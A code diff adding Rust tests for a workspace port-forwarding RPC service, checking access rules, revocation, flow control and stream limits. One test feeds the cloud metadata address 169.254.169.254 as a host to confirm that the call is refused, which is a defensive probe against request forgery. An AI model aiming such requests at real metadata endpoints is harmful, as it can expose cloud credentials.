+    opened
+}
+
+/// An application in the workspace: a listener on this machine's loopback.
+async fn application() -> (tokio::net::TcpListener, u16) {
+    let listener = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.unwrap();
+    let port = listener.local_addr().unwrap().port();
+    (listener, port)
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_port_stream_carries_bytes_both_ways_and_ends_with_the_application() {
+    let f = fixture();
+    let (peer, mut events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
+    let (listener, port) = application().await;
+    let opened = open_port(&f.rpc, &peer, port).await;
+    let stream = opened["streamId"].as_str().unwrap().to_string();
+    assert_eq!(opened["window"], crate::remote::ports::STREAM_WINDOW);
+    let (mut app, _) = listener.accept().await.unwrap();
+
+    call(&f.rpc, &peer, "ports.write", json!({ "streamId": stream, "data": B64.encode("GET / HTTP/1.1\r\n\r\n") })).await.unwrap();
+    let mut request = [0u8; 18];
+    app.read_exact(&mut request).await.unwrap();
+    assert_eq!(&request, b"GET / HTTP/1.1\r\n\r\n");
+    assert_eq!(next_event(&mut events, "ports.drained").await, json!({ "streamId": stream, "bytes": 18 }));
+
+    app.write_all(b"HTTP/1.1 200 OK\r\n\r\nhello").await.unwrap();
+    let data = next_event(&mut events, "ports.data").await;
+    assert_eq!(data["streamId"], stream);
+    assert_eq!(B64.decode(data["data"].as_str().unwrap()).unwrap(), b"HTTP/1.1 200 OK\r\n\r\nhello");
+    assert_eq!(call(&f.rpc, &peer, "ports.list", json!({})).await.unwrap()["streams"], json!([{ "streamId": stream, "port": port }]));
+
+    // The application hangs up: the client is told, and the stream is gone.
+    drop(app);
+    assert_eq!(next_event(&mut events, "ports.closed").await, json!({ "streamId": stream, "reason": "eof" }));
+    assert_eq!(f.rpc.ports.open_streams(), 0);
+    assert_eq!(code(call(&f.rpc, &peer, "ports.write", json!({ "streamId": stream, "data": B64.encode("x") })).await), "not_found");
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_port_stream_reaches_only_the_workspace_loopback_and_only_what_listens() {
+    let f = fixture();
+    let (peer, _events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
+    // A port nothing listens on.
+    let (listener, port) = application().await;
+    drop(listener);
+    assert_eq!(code(call(&f.rpc, &peer, "ports.open", json!({ "port": port })).await), "port_unreachable");
+    // There is no way to name a host: only a port number is read.
+    for params in [json!({ "port": 0 }), json!({ "port": 70000 }), json!({ "port": "3000" }), json!({ "host": "169.254.169.254", "port": -1 }), json!({})] {
+        assert_eq!(code(call(&f.rpc, &peer, "ports.open", params).await), "invalid_params");
+    }
+    assert_eq!(f.rpc.ports.open_streams(), 0);
+    // Not granted, not callable.
+    let (plain, _events) = peer_for(&f.rpc, "d-plain", Authority::Manage).await;
+    assert_eq!(code(call(&f.rpc, &plain, "ports.list", json!({})).await), "capability_not_granted");
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_port_is_opened_by_the_terminals_rule_and_a_stream_is_its_connections_alone() {
+    let f = fixture();
+    f.rpc.set_collaboration(members(json!([
+        { "userId": "u-driver", "role": "driver", "canApprove": true },
+        { "userId": "u-plain", "role": "driver", "canApprove": false },
+        { "userId": "u-viewer", "role": "viewer", "canApprove": true },
+    ])));
+    let (driver, mut driver_events) = ports_peer(&f.rpc, "d-driver", Authority::Participate, Some("u-driver")).await;
+    let (viewer, _viewer_events) = ports_peer(&f.rpc, "d-viewer", Authority::Participate, Some("u-viewer")).await;
+    let (stranger, _stranger_events) = ports_peer(&f.rpc, "d-stranger", Authority::Participate, Some("u-nobody")).await;
+    let (listener, port) = application().await;
+
+    // A viewer neither opens a port nor sees which ones listen (system
+    // services are among them); someone the workspace is not shared with
+    // gets nothing.
+    assert_eq!(code(call(&f.rpc, &viewer, "ports.list", json!({})).await), "forbidden");
+    assert_eq!(code(call(&f.rpc, &viewer, "ports.open", json!({ "port": port })).await), "forbidden");
+    assert_eq!(code(call(&f.rpc, &stranger, "ports.list", json!({})).await), "forbidden");
+    assert_eq!(code(call(&f.rpc, &stranger, "ports.open", json!({ "port": port })).await), "forbidden");
+    // A driver who may not approve permissions is held to the terminal's
+    // rule: what listens locally can run anything.
+    let (plain, _plain_events) = ports_peer(&f.rpc, "d-plain", Authority::Participate, Some("u-plain")).await;
+    let refused = f.rpc.handle(&plain, &json!({ "id": "1", "method": "ports.open", "params": { "port": port } })).await;
+    assert_eq!(refused["error"]["code"], "forbidden");
+    assert_eq!(refused["error"]["data"]["reason"], "approval-required");
+    assert_eq!(code(call(&f.rpc, &plain, "ports.list", json!({})).await), "forbidden");
+
+    let stream = open_port(&f.rpc, &driver, port).await["streamId"].as_str().unwrap().to_string();
+    let (mut app, _) = listener.accept().await.unwrap();
+    // Another connection cannot write to, close or even see the stream.
+    let write = json!({ "streamId": stream, "data": B64.encode("x") });
+    assert_eq!(code(call(&f.rpc, &viewer, "ports.write", write.clone()).await), "forbidden");
+    let (other, _other_events) = ports_peer(&f.rpc, "d-driver-2", Authority::Participate, Some("u-driver")).await;
+    assert_eq!(code(call(&f.rpc, &other, "ports.write", write).await), "not_found");
+    call(&f.rpc, &other, "ports.close", json!({ "streamId": stream })).await.unwrap();
+    assert_eq!(call(&f.rpc, &other, "ports.list", json!({})).await.unwrap()["streams"], json!([]));
+    assert_eq!(f.rpc.ports.open_streams(), 1);
+
+    // The right to approve is taken away while the preview is open: the
+    // stream ends, with the reason, and the application sees its connection close.
+    f.rpc.set_collaboration(members(json!([
+        { "userId": "u-driver", "role": "driver", "canApprove": false },
+        { "userId": "u-viewer", "role": "viewer", "canApprove": true },
+    ])));
+    assert_eq!(next_event(&mut driver_events, "ports.closed").await, json!({ "streamId": stream, "reason": "revoked" }));
+    assert_eq!(f.rpc.ports.open_streams(), 0);
+    let mut rest = Vec::new();
+    assert_eq!(tokio::time::timeout(Duration::from_secs(10), app.read_to_end(&mut rest)).await.unwrap().unwrap(), 0);
+    assert_eq!(code(call(&f.rpc, &driver, "ports.open", json!({ "port": port })).await), "forbidden");
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_closed_connection_takes_its_port_streams_with_it() {
+    let f = fixture();
+    let (peer, _events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
+    let (listener, port) = application().await;
+    open_port(&f.rpc, &peer, port).await;
+    open_port(&f.rpc, &peer, port).await;
+    let (mut first, _) = listener.accept().await.unwrap();
+    assert_eq!(f.rpc.ports.open_streams(), 2);
+    // What a revoked attachment, a suspend or a delete does to a connection.
+    f.rpc.disconnect(&peer);
+    assert_eq!(f.rpc.ports.open_streams(), 0);
+    let mut rest = Vec::new();
+    assert_eq!(tokio::time::timeout(Duration::from_secs(10), first.read_to_end(&mut rest)).await.unwrap().unwrap(), 0);
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn port_streams_are_bounded_in_both_directions_and_in_number() {
+    use crate::remote::ports::{MAX_STREAMS_PER_PEER, STREAM_WINDOW};
+    let f = fixture();
+    let (peer, mut events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
+    let (listener, port) = application().await;
+    let stream = open_port(&f.rpc, &peer, port).await["streamId"].as_str().unwrap().to_string();
+    let (mut app, _) = listener.accept().await.unwrap();
+
+    // The application sends far more than a window. Only a window's worth
+    // travels until the client acknowledges it.
+    let sender = tokio::spawn(async move {
+        let _ = app.write_all(&vec![7u8; 4 * STREAM_WINDOW]).await;
+        app
+    });
+    let mut received = 0usize;
+    while let Ok(Some(event)) = tokio::time::timeout(Duration::from_millis(1500), events.recv()).await {
+        if event["event"] == "ports.data" {
+            received += B64.decode(event["params"]["data"].as_str().unwrap()).unwrap().len();
+        }
+    }
+    assert!(received > 0 && received <= STREAM_WINDOW, "{received} bytes in flight with nothing acknowledged");
+    // An acknowledgement lets the rest through; one for more than was sent mints nothing.
+    let mut acked = 0usize;
+    while received < 4 * STREAM_WINDOW {
+        call(&f.rpc, &peer, "ports.ack", json!({ "streamId": stream, "bytes": received - acked })).await.unwrap();
+        acked = received;
+        let data = next_event(&mut events, "ports.data").await;
+        received += B64.decode(data["data"].as_str().unwrap()).unwrap().len();
+    }
+    assert_eq!(received, 4 * STREAM_WINDOW);
+    let _app = sender.await.unwrap();
+
+    // Toward the application: writes it has not taken are refused past a window, not buffered.
+    let chunk = json!({ "streamId": stream, "data": B64.encode(vec![1u8; MAX_WRITE_BYTES]) });
+    let mut refused = None;
+    for _ in 0..4096 {
+        if let Err((code, _)) = call(&f.rpc, &peer, "ports.write", chunk.clone()).await {
+            refused = Some(code);
+            break;
+        }
+    }
+    assert_eq!(refused.as_deref(), Some("backpressure"));
+    assert_eq!(code(call(&f.rpc, &peer, "ports.write", json!({ "streamId": stream, "data": B64.encode(vec![1u8; MAX_WRITE_BYTES + 1]) })).await), "invalid_params");
+
+    // And in number, per connection.
+    for _ in 1..MAX_STREAMS_PER_PEER {
+        open_port(&f.rpc, &peer, port).await;
+    }
+    assert_eq!(code(call(&f.rpc, &peer, "ports.open", json!({ "port": port })).await), "backpressure");
+    assert_eq!(f.rpc.ports.open_streams(), MAX_STREAMS_PER_PEER);
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn an_open_that_finishes_after_the_connection_closed_or_lost_the_right_makes_no_stream() {
+    let f = fixture();
+    let (listener, port) = application().await;
+    // Still allowed when it was dispatched, not any more when it would be registered.
+    let (peer, _events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
+    let refused = f.rpc.ports.handle(&peer, "ports.open", json!({ "port": port }), &|| false).await.unwrap_err();
+    assert_eq!(refused.code, "forbidden");
+    assert_eq!(f.rpc.ports.open_streams(), 0);
+    // The application sees that connection close: nothing holds it.
+    let (mut app, _) = listener.accept().await.unwrap();
+    let mut rest = Vec::new();
+    assert_eq!(tokio::time::timeout(Duration::from_secs(10), app.read_to_end(&mut rest)).await.unwrap().unwrap(), 0);
+
+    // The connection was disconnected while the open was connecting.
+    f.rpc.disconnect(&peer);
+    let closed = f.rpc.ports.handle(&peer, "ports.open", json!({ "port": port }), &|| true).await.unwrap_err();
+    assert_eq!(closed.code, "unavailable");
+    assert_eq!(f.rpc.ports.open_streams(), 0);
+
+    // Nothing reads what is sent to the connection any more: the same.
+    let (deaf, events) = ports_peer(&f.rpc, "d-2", Authority::Manage, None).await;
+    drop(events);
+    assert_eq!(f.rpc.ports.handle(&deaf, "ports.open", json!({ "port": port }), &|| true).await.unwrap_err().code, "unavailable");
+    assert_eq!(f.rpc.ports.open_streams(), 0);
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_stream_stops_reading_once_nothing_reads_its_connection() {
+    let f = fixture();
+    let (peer, events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
+    let (listener, port) = application().await;
+    open_port(&f.rpc, &peer, port).await;
+    let (mut app, _) = listener.accept().await.unwrap();
+    // The transport is gone before the runtime was told to disconnect.
+    drop(events);
+    app.write_all(b"data for nobody").await.unwrap();
+    let mut rest = Vec::new();
+    assert_eq!(tokio::time::timeout(Duration::from_secs(20), app.read_to_end(&mut rest)).await.unwrap().unwrap(), 0);
+    assert_eq!(f.rpc.ports.open_streams(), 0);
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn an_application_that_speaks_first_is_never_heard_before_the_open_answer() {
+    let f = fixture();
+    let (peer, mut events) = ports_peer(&f.rpc, "d-1", Authority::Manage, None).await;
+    let (listener, port) = application().await;
+    // A server that greets on connect, like SMTP or a database.
+    let greeter = tokio::spawn(async move {
+        let (mut app, _) = listener.accept().await.unwrap();
+        app.write_all(b"220 ready\r\n").await.unwrap();
+        app
+    });
+    // Without the answer on its way, nothing is read from the application.
+    let opened = call(&f.rpc, &peer, "ports.open", json!({ "port": port })).await.unwrap();
+    let _app = greeter.await.unwrap();
+    while let Ok(Some(event)) = tokio::time::timeout(Duration::from_millis(700), events.recv()).await {
+        assert_ne!(event["event"], "ports.data", "data before the stream was started");
+    }
+    f.rpc.ports.start(&peer, opened["streamId"].as_str().unwrap());
+    assert_eq!(B64.decode(next_event(&mut events, "ports.data").await["data"].as_str().unwrap()).unwrap(), b"220 ready\r\n");
+
+    // As the host answers it: the answer and the data share one ordered queue.
+    let (listener, port) = application().await;
+    let greeter = tokio::spawn(async move {
+        let (mut app, _) = listener.accept().await.unwrap();
+        app.write_all(b"220 ready\r\n").await.unwrap();
+        app
+    });
+    f.rpc.answer_port_open(&peer, &json!({ "id": "open-1", "method": "ports.open", "params": { "port": port } })).await;
+    let _app = greeter.await.unwrap();
+    // The first thing about this stream is the answer, the next its data.
+    let about_ports = |value: &Value| value["id"] == "open-1" || value["event"].as_str().is_some_and(|event| event.starts_with("ports."));
+    let mut next_about_ports = async || loop {
+        let value = tokio::time::timeout(Duration::from_secs(20), events.recv()).await.unwrap().unwrap();
+        if about_ports(&value) {
+            return value;
+        }
+    };
+    let first = next_about_ports().await;
+    assert_eq!((first["id"].as_str(), first["ok"].as_bool()), (Some("open-1"), Some(true)), "{first}");
+    let second = next_about_ports().await;
+    assert_eq!(second["event"], "ports.data");
+    assert_eq!(second["params"]["streamId"], first["result"]["streamId"]);
 }
